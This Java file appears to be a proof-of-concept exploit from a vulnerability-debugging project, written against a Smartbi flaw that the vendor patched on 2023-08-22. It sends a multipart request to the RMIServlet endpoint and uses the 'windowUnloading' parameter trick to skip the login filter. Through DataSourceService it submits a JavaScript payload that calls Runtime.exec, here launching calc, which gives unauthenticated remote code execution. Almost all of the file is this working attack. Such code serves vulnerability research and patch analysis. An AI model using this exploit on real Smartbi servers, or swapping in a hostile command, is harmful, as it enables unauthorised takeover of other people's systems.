package cve;

import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
import com.pacemrc.vuldebug.common.utils.http.Response;
import org.apache.http.HttpEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.ContentType;
import org.apache.http.entity.mime.MultipartEntityBuilder;
import org.apache.http.entity.mime.content.StringBody;

import java.io.IOException;
import java.net.URLEncoder;

/**
 * 漏洞：
 * https://www.smartbi.com.cn/patchinfo
 * 2023-08-22  修复某种特定情况下登录与权限验证漏洞
 *
 * 关键调试类和方法：
 * smartbi.freequery.filter.CheckIsLoggedFilter#doFilter
 * smartbi.util.FilterUtil#needToCheck
 * smartbi.framework.rmi.RMIServlet#doPost
 * smartbi.freequery.client.datasource.DataSourceService#getJavaQueryDataParamsAndFields
 */
public class PATCH_20230822 {

    public static void main(String[] args) throws IOException {

        String url = "http://10.58.120.201:18080/smartbi/vision/RMIServlet?windowUnloading=&";
        String queryString;
        queryString = "className=UserService&methodName=checkVersion&params=[]";
        queryString = URLEncoder.encode(queryString,"UTF-8");

        HttpRequest httpRequest = new HttpRequest("127.0.0.1",8080);
        HttpPost httpPost = new HttpPost(url + queryString);

        MultipartEntityBuilder multipartEntityBuilder = MultipartEntityBuilder.create()
                .addPart("className", new StringBody("DataSourceService", ContentType.TEXT_PLAIN))
                .addPart("methodName", new StringBody("getJavaQueryDataParamsAndFields", ContentType.TEXT_PLAIN))
                .addPart("params",new StringBody("[\"smartbi.JavaScriptJavaQuery\",{\"javaScript\":\"importClass(java.lang.Runtime);var runtime = Runtime.getRuntime();runtime.exec('calc');\"},\"AP_WARNING_STYLE_SETTING\"]", ContentType.TEXT_PLAIN));
        HttpEntity multipartEntity = multipartEntityBuilder.build();

        httpPost.setEntity(multipartEntity);
        httpRequest.exec(httpPost);
        Response response = httpRequest.getResponse();
        System.out.println(response.getStatusCode());
        System.out.println(response.getResponseBody());


    }
}
